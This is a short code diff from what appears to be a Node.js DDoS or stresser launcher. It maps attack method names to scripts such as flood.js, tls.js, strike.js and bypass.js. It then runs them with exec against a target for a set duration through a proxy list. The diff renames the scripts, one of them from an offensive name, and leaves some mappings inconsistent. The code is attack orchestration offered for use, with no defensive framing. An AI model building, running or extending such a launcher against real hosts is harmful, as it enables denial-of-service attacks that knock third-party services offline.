@@ -293,16 +293,16 @@ const metode = path.join(__dirname, `/lib/cache/${methods}`);
           sigma()
           } else if (methods === 'slim') {
        pushOngoing(target, methods, duration)
-const destroy = path.join(__dirname, `/lib/cache/destroy.js`);
-const storm = path.join(__dirname, `/lib/cache/storm.js`);
-const rape = path.join(__dirname, `/lib/cache/rape.js`);
+const flood = path.join(__dirname, `/lib/cache/flood.js`);
+const tls = path.join(__dirname, `/lib/cache/tls.js`);
+const strike = path.join(__dirname, `/lib/cache/strike.js`);
+const kill = path.join(__dirname, `/lib/cache/kill.js`);
 const bypass = path.join(__dirname, `/lib/cache/bypass.js`);
-const thunder = path.join(__dirname, `/lib/cache/rape.js`);
-const slim = path.join(__dirname, `/lib/cache/slim.js`);
-const raw = path.join(__dirname, `/lib/cache/raw.js`);
-        exec(`node ${destroy} ${target} ${duration} 100 1 proxy.txt`)
-        exec(`node ${storm} ${target} ${duration} 100 1 proxy.txt`)
-        exec(`node ${rape} ${duration} 1 proxy.txt 70 ${target}`)
+const slim = path.join(__dirname, `/lib/cache/raw.js`);
+const raw = path.join(__dirname, `/lib/cache/thunder.js`);
+        exec(`node ${flood} ${target} ${duration} 100 1 proxy.txt`)
+        exec(`node ${tls} ${target} ${duration} 100 1 proxy.txt`)
+        exec(`node ${strike} ${duration} 1 proxy.txt 70 ${target}`)
           sigma()
           } else {
     console.log(`Method ${methods} not recognized.`);
